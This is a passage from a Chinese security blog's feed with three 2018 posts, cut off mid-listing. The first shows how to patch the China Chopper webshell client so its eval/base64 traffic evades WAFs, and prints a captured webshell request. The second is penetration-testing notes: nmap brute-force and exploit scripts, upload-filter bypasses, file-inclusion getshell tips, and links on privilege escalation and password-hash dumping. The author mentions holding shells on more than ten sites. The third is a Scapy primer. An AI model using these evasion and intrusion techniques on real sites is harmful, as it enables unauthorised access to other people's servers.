    </entry>
    
    <entry>
      <title>Bypass菜刀进化成过Waf刀</title>
      <link href="/2018/08/21/Bypass%E8%8F%9C%E5%88%80%E8%BF%9B%E5%8C%96%E6%88%90%E8%BF%87Waf%E5%88%80/"/>
      <url>/2018/08/21/Bypass%E8%8F%9C%E5%88%80%E8%BF%9B%E5%8C%96%E6%88%90%E8%BF%87Waf%E5%88%80/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我要在这里大肆吐槽，今天的底层软件好像都在刁难我。首先是用UPX脱壳工具<br>把菜刀脱坏掉了，然后重新下一个。在换一个脱没毛病，用C32asm进行字符替换的时候不给我替换。我特么。。。后面还是用Hxdx64进行替换的，我也是醉了。</p><p><img src="https://i.imgur.com/rPw2ac5.jpg" alt=""></p><pre><code>正式进入贪婪之岛篇！</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><pre><code>bypass菜刀教程：https://github.com/admintony/BypassCaiDao</code></pre><p>首先你要有把2010年的菜刀，因为16年的菜刀的数据包不同，然后你还需要一些底层工具。</p><pre><code>2010菜刀：链接: https://pan.baidu.com/s/1jvECLJjpsh4OsclZFHkv8g 密码: 6n1h吾爱破解工具包：链接：https://pan.baidu.com/s/1nwJg0eX  密码: iuj3WSExplorer抓包工具：https://blog.mycike.com/154.html</code></pre><p>我们首先把菜刀的UPX壳给脱了，这里我就不说了。自己脱掉就行<br><img src="https://i.imgur.com/m4Tcb1Z.png" alt=""><br>脱壳：</p><p><img src="https://i.imgur.com/993lYUE.png" alt=""></p><p>然后我们启动WSExplorer抓包工具，选择菜刀想进程进行抓包（用菜刀连shell）<br><img src="https://i.imgur.com/FxN5FLd.png" alt=""><br>然后我们可以看到图上抓到的包</p><pre><code>x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7</code></pre><p>这里引用文章的解释：</p><pre><code>x 是shell的密码，其中的数据是让shell再接收一个z0z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.</code></pre><p>然后文章把User-Agent头也改了，这里我就不改了。因为我获取了文件偏移地址但不会转为内存偏移地址（手动滑稽）</p><p>我们直接修改第一个参数数据：<br>首先用C32asm搜索：@eval(base64_decode($<em>POST[z0])); 替换成Dizep,fewi:8chigshi,(cTSWX</em>~4a–?（我这里的C32asm刁难我）<br><img src="https://i.imgur.com/67Pzx2W.png" alt=""><br>用HxDx64来替换<br><img src="https://i.imgur.com/dvYLN4b.jpg" alt=""><br>然后找一个有waf的站来测试，就用我之前过安全狗文件上传的那个站吧<br><img src="https://i.imgur.com/801VXaI.png" alt=""><br>（如果用普通的刀和一句话连的话和上图一样）<br><img src="https://i.imgur.com/eqR09oE.png" alt=""><br>转载请注明转自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试信息笔记</title>
      <link href="/2018/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>暑假快过完了，剩下的日子也没有多少。假期也写了不少脚本还有一个<br>CMS_DEBUG的脚本没用写完。里面集合比较多的CMS漏洞插件，测试过<br>都能用的。假期也拿了10几个shelll，虽然都提不了权限（滑稽）<br>总结一下假期所学到的东西。<br><img src="https://i.imgur.com/cCcSqID.jpg" alt=""></p><pre><code>重要的日历缺了一部份，被遗忘的月份将会被盛大地吊唁。在身着丧服的乐团演奏之下，农历十一月的月亮安稳地运行着。菊花与叶片一同枯萎凋零，躺卧在沾血的火红之眼旁边。就算剩下的伙伴只有一半，你的优越地位依然屹立不倒。享受这幕间休息时间吧，去找新伙伴也行。出发时可往东去，一定会遇到等待你的人</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><strong>信息收集:</strong><br>是渗透测试的第一部分也是最重要的一部分。信息收集的大小决定挖出的漏洞，与漏洞的高危。<br><strong>一、web指纹与网站信息的收集：</strong></p><pre><code>爱站网进行SEO综合信息收集whatweb指纹收集 //whatweb -v 域名云悉进行CMS指纹识别判断网站是否有CDN,查询网站真实IPGoogle Hacking技巧nc抓网站指纹一些浏览器的插件可以识别web程序的指纹Zoomye与shodan进行搜索</code></pre><p><strong>二、路径探测与敏感信息泄露</strong></p><pre><code>敏感信息泄露/.robots.txt //通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。由于这样让我们知道了网站的一些敏感文件/.git //所有该项目的源代码,私有仓库的地址,私密的配置信息,所有commiter的邮箱帐号信息,(可能)内部的帐号和密码/.svn //所有该项目的源代码,svn仓库的地址,svn仓库所属用户的用户名/.hg //项目源代码,项目仓库地址,(可能)仓库的用户名,其他/.bzr //源代码,仓库地址,开发者的信息/.cvs //因为是纯客户端的工具, 所以只会泄露源代码备份文件泄露，如vim的/.swpWEB-INF目录泄露 //在Java的Servlet 文档中,说到WEB-INF目录&quot;包含了所有web应用会用到但是不处于web路径中的资源&quot;, 也就是说, WEB-INF目录下的内容是不属于公开页面的.web应用可以通过getResource等API在servlet的上下文中访问到这些资源.通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)配置文件泄露配置错误导致的泄露敏感的信息存在于源码之中 //通过F12浏览现在许多网站都会存放一些敏感信息，比如学校的教务处系统就会上传一些和学生信息，如果这些 word 文件没有设置好相关权限，在网上搜索就可以搜索到相关敏感录访问文件相关网址也可以访问到相关文档。所以包含以下几点注意信息： 每个文件和文件夹权限必须设置。 一些相关敏感文档要及时清理，防止泄露。或者不包含敏感信息。 防止浏览进行下载敏感文件后缀 .zip，.tar，.gz，.tgz，.rar，... :(压缩）归档文件 .java：没有理由提供对 Java 源文件的访问 .txt：文本文件 .pdf：PDF 文档 .doc，.rtf，.xls，.ppt，...：Office 文档 .bak，.old 和其他指示备份文件的扩展（例如：〜用于 Emacs 备份文件）更多信息，请查看链接: http://filext.com/路径探测与敏感信息泄露利用工具通过brupsuite的Spider功能进行爬虫dirb进行路径探测dirbuster一些其他自动化进行路径探测的工具nikto -h http://xxx.com</code></pre><p><strong>三、web服务枚举</strong></p><pre><code>whois信息收集DNS信息收集子域名查询旁站查询端口扫描C段扫描dns域传输漏洞网站敏感目录 网站泄露的目录 查看HTML有没有有用的注释收集管理员邮箱 网站后台 一些工具的用法(首先通过判断目标存在扫描服务用适当的脚本进行检测)：nmap命令：nmap -sV IP    nmap -p 1-65535 IPnmap -A IPnmap --script=vuln IPnmap --max-parallelism 800--script http-slowloris IP //检测http服务拒绝nmap -p 8080 --script http-iis-short-name-brute IP //IIS 短文件泄露nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 IP //ftp弱口令暴力破解nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=IP //验证http中开启的-methods 方法nmap -sV --script http-vuln-cve2015-1635 IP //验证HTTP.sys 远程代码执行nmap -sV -p 443 --version-light --script ssl-poodle IP //验证 SSL POODLE information leaknmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt IP //验证http 中开启了put 方法nmap --script mysql-empty-password IP //验证mysql 匿名访问nmap -v -v --script ssl-cert IP //验证ssl-cert证书问题nmap -Pn --script ssl-date IP //验证SSL证书的有限期nmap -p 443 --script ssl-known-key IP //验证 Debian OpenSSL keysnmap --script ssl-enum-ciphers IP //验证弱加密SSL套件nmap IP --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2 //验证多种SSL漏洞问题nmap --script sniffer-detect IP //在网络中检测某主机是否存在窃听他人流量nmap -sV --script unusual-port IP //精准地确认端口上运行的服务nmap --script brute IP //使用nmap 对常见的服务进行暴力破解nmap --script exploit IP //使用nmap 利用已知的漏洞入侵系统nmap --script external IP //使用nmap 进行利用第三方的数据库或资源进行信息收集或者攻击nmap --script fuzzer IP //使用nmap 进行模糊测试，发送异常的包到目标机，探测出潜在漏洞 nmap --script intrusive IP //使用nmap 进行入侵，此类脚本可能引发对方的IDS/IPS的记录或屏蔽nmap --script malware IP //使用nmap 探测目标机是否感染了病毒、开启了后门等信息nmap --script safe IP //使用nmap 对系统进行安全检查nmap --script nmap-vulners,vulscan --script-argsvulscandb=scipvuldb.csv -sV //CVE漏洞扫描 详细方法：http://www.freebuf.com/sectool/161664.html    dnsenum命令：dnsenum 域名查询子域名：AQUATONE 用法：http://www.freebuf.com/sectool/137806.html子域名挖掘神器：https://pan.baidu.com/s/1dFJzIJR旁站查询：用一些在线的工具进行查询，如站长助手与爱站网之类的御剑有旁站查询和C段扫描的功能的版本C段扫描：whatweb --no-errors --url-prefix https:// 192.168.0.0/24</code></pre><p><strong>四、明确web程序入口点</strong></p><pre><code>HTTP 请求（request）：明确代码中哪一块使用的是 GET 传输，哪一块是 POST 传输。明确所有 HTTP 请求全部使用 POST 传输。（包括一些隐藏的参数 hidden）明确所有传输是 GET 提交的时候，要做好标记。明确哪些是查询字符串参数（说明白就是输入、输出）即使做了编码或加密，也要注意参数，在应用中做了哪些调用。HTTP 回复（response）：明确 header 返回哪些参数查看哪些目录返回是以 200、300、403 以及 500 返回，做好标记，都把他们重定向首页，防止其它页上面泄露不必要信息。一些注意点如下：可以使用 BurpSuite 工具，去查看一些隐藏</code></pre><p>做完以上的内容之后，做一个总结。</p><p><strong>漏洞挖掘</strong>：<br>做完信息收集之后就到了漏洞挖掘这一步，挖掘漏洞看了挺多大牛的文章。这里<br>我也做了几点总结。</p><pre><code>在做完信息收集这一步后，想必已经知道了中间件的版本信息之类的。我们可以利用searchsploit来寻找中间件的漏洞。如果知道CMS版本去搜Google搜一下这个版本或者这个CMS的漏洞如：dede_cms的远程写入漏洞。表单尝试弱口令，表单尝试逻辑漏洞，模糊登录测试 工具：cewl [options] www.example.comBurpsuite自动化的漏洞挖掘：Burp Scanner    自动化扫描安全漏洞的Burp Suite工具HTTP 安全方法测试:HTTP 方法主要应用在 Web 服务器上面，通过部署一些应用可以查看到一些相关的方法。HT议，最超见的传输有 GET、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT 传输方法，而 GET 是在 URL 可见的，相对不安全，风险高。显示的参数，风险低。常见的 HTTP 方法有 GET其中一些方法可能会对 Web 应用程序造成安全风险，因为它们允许攻击者修改存储在 Web 在某些情况下窃取合法的证书用户。 更具体地操作，应该禁用的方法如下： PUT：该方法允许客户端上传 Web 服务器上的新文件。 攻击者可以利用它通过上传恶意用 cmd.exe 执行命令的 asp 文件）或者通过简单地使用受害者服务器作为文件存储。 DELETE：此方法允许客户端删除 Web 服务器上的文件。 攻击者可以利用它作为一种非破坏网站或发起 DoS 攻击。 CONNECT：此方法可以允许客户端将 Web 服务器用作代理。 TRACE：这个方法简单地返回给客户端，不管字符串是否发送给客户端服务器，主要用 黑盒测试通过抓包软件查看一下服务器支持哪些 HTTP 协议般会在传输的头部加 OPTIOHTTP 传输加密安全测试 :HTTP 传输安全性（HSTS）标头是网站必须通信的一种机制。浏览器必须通过 https 发送。应对安全的重要措施，首先是要验证网站是否正在使用这种安全措施 HTTP 标头，以确保器传输到服务器。HTTP 严格传输安全性（HSTS）功能允许 Web 应用程序通过浏览器通知浏览器使用特殊立到指定域的连接使用 HTTP 的服务器。 相反，它应该自动建立所有访问该网站的连接请TP 在浏览器是以明文传输，这样会泄露一些重要信息，使用 https 加密传输，首先会符合过程中也会进行加密，防止信息在传输过程中泄密。HTTP 传输 header 严格按照两个指 max-age：浏览器应该自动从 HTTP 转换到 HTTPS 协议。 includeSubDomains：指示所有 Web 应用程序的子域名必须使用 HTTPS展示一个 HSTS 头实现的例子ict-Transport-Security: max-age=60000; includeSubDomains须检查 Web 应用程序使用上述 header，并查找是否可能产生以下安全问题：攻击者嗅探网络流量并访问通过未加密通道传输的Cross Domain 策略测试:RIA 是基于 Web 的服务，可以在浏览器去执行一些操作，和桌（例如 Java，Adobe Flash，Adobe）可以访问不同区域的数据。 对的 crossdomain.xml，并另外创建了它自己的跨域策略文件：clie跨域的时候，它都会首先查找目标域中的策略文件，用于确定是是允许的。主策略文件位于域的根目录。 客户端可能会被指示加载不同的主策略文件允许所请求的策略文件。 如何测试在 Web 的根目录去查找这两个文件，查看是否可以访问，clientaccesspolicy.xm角色定义测试 : 测试目标管理员的角色应该和其它应用角色分配清楚，管理员权限应该只设定管理人员管理，而应用管理的权限只能用来管理应用即可，两者不能混淆。 如何测试我们利用管理员的账号通抓包去修改一些相应的参数，查看是否可以看到应用管理员的一些相关信息。 现在，我有很多 WordPress 的网站，WordPress 的角色定义的例子可以在下面显示的链接中找到。 https://codex.wordpress.org/Roles_and_Capabilities 安全测试工具 BurpSuite 手工测试使用普通用户登录，在查看用户的同时，BRUP 已经把页面扫描了一遍，不仅可以查看面目，也可以进行扫描工具。BurpSuite 是一个非常强大的工具用户注册安全测试:测试目标验证用户注册的身份要求是否与业务和安全性保持一致验证一下用户注册过程如何测试测试列表 确定谁可以注册访问（任何人）？ 注册是否在供应之前由人工审查，或者如果注册是自动授予的 该标准得到满足。 同一个人是否可以多次注册？ 用户可以注册不同的角色或权限吗？ 注册成功需要什么样的身份证明？ 是否验证了注册身份？ 身份信息是否容易伪造或伪造？ 在注册过程中可以交换身份信息吗？测试工具 Manual test HTTP proxy (Burp Suite, ZA用户账户权限测试: 目标测试验证低权限用户是否可以去查看高权限用户的信息，或者低权限用户可以修改高用户的资料。 如何测试测试项 是否有一些验证，审核和授权的配置请求？ 是否有一些验证，审核和批准取消请求？ 管理员可以查看其它管理员信息吗，所谓平行越权？ 管理员或其他用户可以查看上级的用户信息吗？ 管理员或用户是否可以自行解除配置？权限配置是否可以删除一些个人信息，如果设置禁用，用户是否通过其它途径 利用工具：名称    描述Compare Site Maps    Burp的用于测试授权的模块这里有个小技巧，就是注册两个不同权限的用户，然后用高权限的用户去访问整个Web应用，退出高权限用户，登录低权限用户,然后用Burp的Compare Site Maps工具去测试哪些页面的权限控制没有做好。账户枚举和用户帐户猜解测试: 黑盒测试一般情况下，测试人员对目标的用户设施一点都不知道，也没有进行信息地显示一些用于枚举用户的信息。 HTTP 响应信息 测试正确的用户名和错误,看看是否会返回一些逻辑上的问题。如用户正确密码错误则返回密码错误，从找登陆，注册，回密码进行测试看看是否能发现用户一些敏感信息。HTTP 数据传输认证测试：看看是否有未加密的信息在传输或者使用GET请求HTTP 默认认证测试：测试一些有共同测试点的信息 测试一些默认的用户：admin, administrator, root, system, guest, operator, superuser。在源代码里面查看是否有一些注释写着用户名和，检查一下配置文件，里面会涉及到用户名和密码，暴力破解锁定测试：简述户锁定机制用于缓解暴力密码猜测攻击。 通常在 3 到 5 次间段后，通过自助服务解锁机制或管理员干设置才能解锁。 止用户被拒绝授权访问之间取得平衡。目标对象评估帐户锁定机制减轻暴力密码猜测的能力评估解锁机制对未授权帐户解锁的绕过认证协议测试：当应用程序根据固定值参数验证成功登录时用户可以修改这些参数可以访问而无需提供有效的sql注入测试：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试与手测，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入强制浏览如果： Web 应用程序仅在登录页面上实现访问控制，则可以绕过认证架绕过 SESSION 管理协议测试:主要攻击步骤如下： Cookies 收集：收集充足数量的 cookies 样本。 Cookie 逆向工程：分析 cookie 的生成算法。 Cookie 篡改：伪造一个有效的 cookie 来执行攻击。最后一步可能要求 大量的尝试，取决于 cookie 是如何被创造的(cookie 暴力破解攻COOKIE 会话漏洞测试： 测试 cookie 属性漏洞。通过使用一个拦截代理或者拦截浏览器插件，捕捉应用程序设置 cookie 值(set-cookie)的所有的响应包,并且检查下列内容： Secure 字段属性：当一个 cookie 包含了敏感信息或者一个 session token 时，这个 cookie 应该通过加密通道进行传输。举个例子：当登陆进一个应用并且使用 cookie 设置会话令牌(session token)后，应该使用“;secure”标志验证它是否被打上标记。如果 secure 没有被打上标记，浏览器会同意使用未加密的渠道来传递cookie 值：例如通过 http 协议。因此，攻击者可以诱导用户通过不安全的隧道提交他们的 cookie 值，从而导致信息的泄露。 HttpOnly 字段属性：这个属性应该一直被设置，即使并不是所有的浏览器都支持这个属性。这个属性可以避免 cookie 值被用户端脚本获得。这个属性无法消除跨站脚本攻击但是能消除一些危险的攻击。所以，记得检查是否 httpOnly 标签被设置了。 domain 字段属性：验证域名是否设置的太宽松。这个属性只应该为需要接收 cookie 的服务器设置。举个例子，如果应用驻留在服务器 app.mysite.com 上，那么 domain 属性应该为&quot;domain=app.mysite.com&quot;而不是“domain=.mysite.com&quot;. 因为后者可能会允许潜在的易受攻击的服务器接收到 cookie 值。 Path 字段属性： 认证路径属性，就像 domain 属性所介绍的一样，不能被设置的太过松散。即使 domain字段属性已经被设置的尽可能的安全紧凑，如果 path 属性被设置在根目录’/’下，其他一些运行在同一个服务器下的不安全的应用也可能会受到攻击。举个例子：如果一个应用运行在/myapp/目录下，其 cookie路径应该设置为“;path = /myapp/“而不是”;path= /”或“;path= /myapp”。注意到”/”应该紧跟在 myapp 的后面。如果不这样设置，浏览器将会发送 cookie 值给任何包含了”myapp” 例如”myapp-exploited”的路径。 Expires 字段属性：如果将此属性设置为将来的某个时间，则到期后该 cookie 值会失效。举个例子：如果一个 cookie 设置&quot;; expires=Sun, 31-Jul-2019 13:45:29 GMT&quot;而当前时间为 July 31st 2018，那么测试者就应该检查这个 cookie 值。如果这个 cookie 值是一个存储在用户硬盘中的会话令牌（session token），那么能访问这个 cookie 的攻击者或者本地的用户（例如 admin 用户）就能通过重新提交这个 token 值访问这个应用，直到这个 cookie 过期SESSION 固定攻击测试：当服务器端完成一次成功的用户认证后，如果一个应用不刷新用户的 session cookie 值，就有可能存在 SESSION定攻击漏洞。在这种情况下，攻击者可以迫使一个用户使用一个攻击者已知的cookie值，从而窃取用户的Session，现 session 劫持。ion 固定攻击漏洞发生的场景：一个 web 应用程序通过继续使用与用户关联的会话 ID 对用户进行身份验证，而不会首先使现存的会话 ID 无效。一个攻击者能够强制用户使用已知的会话 ID，以便在用户进行身份验证后，攻击者能够访问经过身份验证的会话。SQL注入：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入文件上传：能上传文件的地方就尝试进行挖掘。遇到拦截先看看服务器用什么配置的环境。例如是IIS6.0（IIS环境大部分都有文件上传漏洞可以百度发现）或Apache等等。。都可以百度看看有什么上传绕过。一般绕过方式为：后缀大小写绕过，文件类型绕过，双写后缀名绕过，请求特殊后缀绕过，图片木马合并上传，文件00截断绕过，截断攻击%和&amp;，web服务器环境配置寻找漏洞  例如：IIS6.0的解析漏洞1）前端JavaScript验证 （发现有只前端验证的话，手动写一个文件上传的html将action设置为判断文件即可。）例如：检测上传文件的是：upload.php 但是服务端没做判断，前端做了判断。&lt;form action=’http://xx/upload.php’ method=’post’&gt;&lt;input type=’file’ name=’file’ id=’file’&gt;&lt;br&gt;&lt;input type=’submit’ value=’提交’&gt;&lt;/form&gt;文件包含：注意url后面有include=xx.php,或tiao=xx.php，file=xxx.php，总之注意一下url。先判断远程包含或本地包含，可以远程包含直接Getshell即可。本地包含可以利用各种伪协议例如：php,data,zip等等。。或与文件上传漏洞一起利用。详细的利用手法：https://www.cnblogs.com/haq5201314/p/9248281.htmlnginx文件解析漏洞：找到一张图片后面加上/.php。如果返回乱码则出现该漏洞xss：利用web程序，插入了恶意javascript代码就是xss。xss分为三种：反射型xss，存储型xss，DOM型xss。在能输入的地方插入xss payload代码进行测试xml注入（XXE）：当Web应用的XML解析器没有正确的验证攻击者传入的XML文档，就会发生XML注入。 xml注入漏洞：https://www.cnblogs.com/xiaozi/p/5785165.html模板注入：模板注入就是攻击者利用模板的语法注入恶意代码。教程：http://www.cnblogs.com/wfzWebSecuity/p/9415641.html命令注入：用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。 教程：https://www.cnblogs.com/enderzhou/p/6836678.html恶意重定向：当应用没有对用户输入的URL进行检查就造成了恶意重定向。测试方法：对一些请求名加入URL看看是否会跳转</code></pre><p><strong>一些后渗透的学习：</strong><br>前面也说了，拿到了shell嘛虽然处于提不了权的尴尬地位。但是还是有一些学习滴（滑稽智商产出99+）</p><p>windows方面的提权用到的命令（这里懒得打命令，直接放url（滑稽x3））：</p><pre><code>有关windows提权说明：http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html假期写的windows提权辅助脚本：https://github.com/422926799/python/blob/master/windows_collect.py</code></pre><p>Linux方面提权用到的命令：</p><pre><code>利用Linux的path环境进行提权https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&amp;mid=2651149779&amp;idx=1&amp;sn=cfb63bb2ac725e017c619a449e6a53ee&amp;chksm=8c214e49bb56c75f7a6b41da63f4fdf7c8ee5269fce11e82cf853342af03a9ff72c862e1764c&amp;mpshare=1&amp;scene=23&amp;srcid=0712tJEadbXElVmSvoLVgkAE#rd从NTDS.dit获取密码hash的三种方法http://www.freebuf.com/sectool/176876.htmlLinux提权：https://guif.re/linuxeop假期写的Linux提权赋值脚本：https://github.com/422926799/python/blob/master/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/informationgathering.py</code></pre><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>现实中提权并不可能那么顺利，那么就要靠大家搜索一些奇淫技巧了。到时候我会写的。就在刚刚手贱把下了6.5GMac镜像删除了。。。。<br>(如果要学习好渗透的话，自己所画的学习图是不可少的)<br>例如:<br><img src="https://i.imgur.com/Tzw5jOh.png" alt=""></p><p>好了，这里就到此为止。转载请注明：422926799.github.io 九世的博客<br>欢迎加入即刻安全技术交流群：307283889</p><pre><code>重要的记忆缺少了一个人，在梦中你的出现，勾勒起遗忘的过去......</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy的认识</title>
      <link href="/2018/08/17/Scapy%E7%9A%84%E8%AE%A4%E8%AF%86/"/>
      <url>/2018/08/17/Scapy%E7%9A%84%E8%AE%A4%E8%AF%86/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送它们，捕获它们，匹配请求和回复等等。它可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现（它可以取代hping，85％的nmap，arpspoof，arp-sk，arping，tcpdump，tethereal，p0f等）。它还能在许多其他工具无法处理的其他特定任务中表现良好，例如发送无效帧，注入自己的802.11帧，组合技术（VLAN跳跃+ ARP缓存中毒，WEP加密通道上的VOIP解码，…… ）等</p><p><img src="https://i.imgur.com/PhZuxdD.jpg" alt=""></p><h2 id="scapy的基础使用"><a href="#scapy的基础使用" class="headerlink" title="scapy的基础使用"></a>scapy的基础使用</h2><p>scapy的安装方法：</p><pre><code>Linux安装方法：sudo apt-get install scapypip install scapywindows的安装方法：pip install scapyMac的安装方法：pip install scapy</code></pre><p>安装完成之后在终端执行sudo scapy可以见到如下图：<br><img src="https://i.imgur.com/UdSxoff.png" alt=""><br>(当然那个banner也有可能没有出现)<br>框架包的引入</p><pre><code>from scapy.all import *</code></pre><p>查看配置信息：</p><pre><code>from scapy.all import *printf(conf)</code></pre><p><img src="https://i.imgur.com/zsWHhuY.png" alt=""><br>配置信息：</p><pre><code>ASN1_default_codec = &lt;ASN1Codec BER[1]&gt;AS_resolver = &lt;scapy.as_resolvers.AS_resolver_multi object at 0x7fae78a43b70&gt;BTsocket   = &lt;BluetoothRFCommSocket: read/write packets on a connected L2CAP...L2listen   = &lt;L2ListenSocket: read packets at layer 2 using Linux PF_PACKET ...L2socket   = &lt;L2Socket: read/write packets at layer 2 using Linux PF_PACKET ...L3socket   = &lt;L3PacketSocket: read/write packets at layer 3 using Linux PF_P...auto_crop_tables = Trueauto_fragment = 1cache_iflist = {}cache_ipaddrs = {}checkIPID  = 0checkIPaddr = 1checkIPinIP = TruecheckIPsrc = 1check_TCPerror_seqack = 0color_theme = &lt;NoTheme&gt;commands   = IPID_count : Identify IP id values classes in a list of packets...contribs   = {}crypto_valid = Falsecrypto_valid_advanced = Falsedebug_dissector = 0debug_match = 0debug_tls  = 0default_l2 = &lt;class &apos;scapy.packet.Raw&apos;&gt;emph       = &lt;Emphasize []&gt;ethertypes = &lt;/etc/ethertypes/ n_802_AD n_802_1AE&gt;except_filter = &apos;&apos;extensions_paths = &apos;.&apos;fancy_prompt = Truegeoip_city = Nonehistfile   = &apos;/home/nineworld/.scapy_history&apos;iface      = &apos;ens33&apos;iface6     = &apos;lo&apos;interactive = Falseinteractive_shell = &apos;&apos;ipv6_enabled = Truel2types    = 0x0 -&gt; Loopback (Loopback) 0x1 &lt;- Dot3 (802.3) 0x1 &lt;-&gt; Ether (E...l3types    = 0x3 -&gt; IP (IP) 0x800 &lt;-&gt; IP (IP) 0x806 &lt;-&gt; ARP (ARP) 0x86dd &lt;-&gt;...layers     = Packet : &lt;member &apos;name&apos; of &apos;Packet&apos; objects&gt; NoPayload : &lt;membe...load_layers = [&apos;l2&apos;, &apos;inet&apos;, &apos;dhcp&apos;, &apos;dns&apos;, &apos;dot11&apos;, &apos;gprs&apos;, &apos;hsrp&apos;, &apos;inet6&apos;...logLevel   = 30manufdb    = &lt;00:50:C2:AF:C0:00/36 OdusTech, Odus Technologies SA&gt; &lt;00:50:C2...mib        = &lt;MIB/ prime192v2 EV_T_Telessec_GlobalRoot_Class_3 pkcs_9_sx bas...min_pkt_size = 60neighbor   = Ether -&gt; IPv6 Ether -&gt; LLC Ether -&gt; ARP Dot3 -&gt; LLC Ether -&gt; Do...netcache   = arp_cache: 0 valid items. Timeout=120s in6_neighbor: 0 valid it...noenum     = &lt;Resolve []&gt;padding    = 1padding_layer = &lt;class &apos;scapy.packet.Padding&apos;&gt;prog       = display = &apos;display&apos; dot = &apos;dot&apos; hexedit = &apos;hexer&apos; ifconfig = &apos;i...promisc    = 1prompt     = &apos;&gt;&gt;&gt; &apos;protocols  = &lt;/etc/protocols/ dccp rohc ospf eigrp xns_idp ax_25 rspf ipip i...raw_layer  = &lt;class &apos;scapy.packet.Raw&apos;&gt;raw_summary = Falseresolve    = &lt;Resolve []&gt;route      = Network Netmask Gateway Iface Output IP Metric 0.0.0.0 0.0.0.0 ...route6     = Destination Next Hop Iface Src candidates Metric fe80::/64 :: e...services_tcp = &lt;/etc/services-tcp/ fax remoteping cvspserver sane_port sge_q...services_udp = &lt;/etc/services-udp/ sge_qmaster venus imap2 gopher omirr rtsp...session    = &apos;&apos;sniff_promisc = 1stats_classic_protocols = [&lt;class &apos;scapy.layers.inet.TCP&apos;&gt;, &lt;class &apos;scapy.la...stats_dot11_protocols = [&lt;class &apos;scapy.layers.inet.TCP&apos;&gt;, &lt;class &apos;scapy.laye...stealth    = &apos;not implemented&apos;temp_files = []teredoPrefix = &apos;2001::&apos;teredoServerPort = 3544use_bpf    = Falseuse_dnet   = Falseuse_npcap  = Falseuse_pcap   = Falseuse_pypy   = Falseuse_winpcapy = Falseverb       = 2version    = &apos;2.4.0&apos;warning_threshold = 5wepkey     = &apos;&apos;</code></pre><p>查看scapy支持的协议</p><pre><code>from scapy.all import *print(ls())</code></pre><p><img src="https://i.imgur.com/TxOYQXi.png" alt=""></p><pre><code>AH         : AHARP        : ARPASN1P_INTEGER : NoneASN1P_OID  : NoneASN1P_PRIVSEQ : NoneASN1_Packet : NoneATT_Error_Response : Error ResponseATT_Exchange_MTU_Request : Exchange MTU RequestATT_Exchange_MTU_Response : Exchange MTU ResponseATT_Find_By_Type_Value_Request : Find By Type Value RequestATT_Find_By_Type_Value_Response : Find By Type Value ResponseATT_Find_Information_Request : Find Information RequestATT_Find_Information_Response : Find Information ReponseATT_Handle_Value_Notification : Handle Value NotificationATT_Hdr    : ATT headerATT_Read_By_Group_Type_Request : Read By Group Type RequestATT_Read_By_Group_Type_Response : Read By Group Type ResponseATT_Read_By_Type_Request : Read By Type RequestATT_Read_By_Type_Request_128bit : Read By Type RequestATT_Read_By_Type_Response : Read By Type 